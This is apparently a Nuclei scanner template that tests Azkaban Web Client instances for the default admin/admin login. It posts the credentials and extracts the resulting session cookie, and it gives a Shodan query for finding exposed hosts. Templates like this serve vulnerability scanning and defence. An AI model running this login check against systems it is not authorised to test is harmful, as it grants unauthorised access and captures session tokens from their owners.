id: azkaban-default-login

info:
  name: Azkaban Web Client Default Credential
  author: pussycat0x
  severity: high
  description: Azkaban is a batch workflow job scheduler created at LinkedIn to run Hadoop jobs.  Default web client credentials were discovered.
  classification:
    cwe-id: CWE-798
  metadata:
    shodan-query: http.title:"Azkaban Web Client"
  tags: default-login,azkaban

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        action=login&username={{username}}&password={{password}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"session.id"'
          - '"success"'
        condition: and

      - type: word
        words:
          - 'azkaban.browser.session.id'
          - 'application/json'
        condition: and
        part: header

      - type: status
        status:
          - 200

    extractors:
      - type: kval
        kval:
          - azkaban.browser.session.id

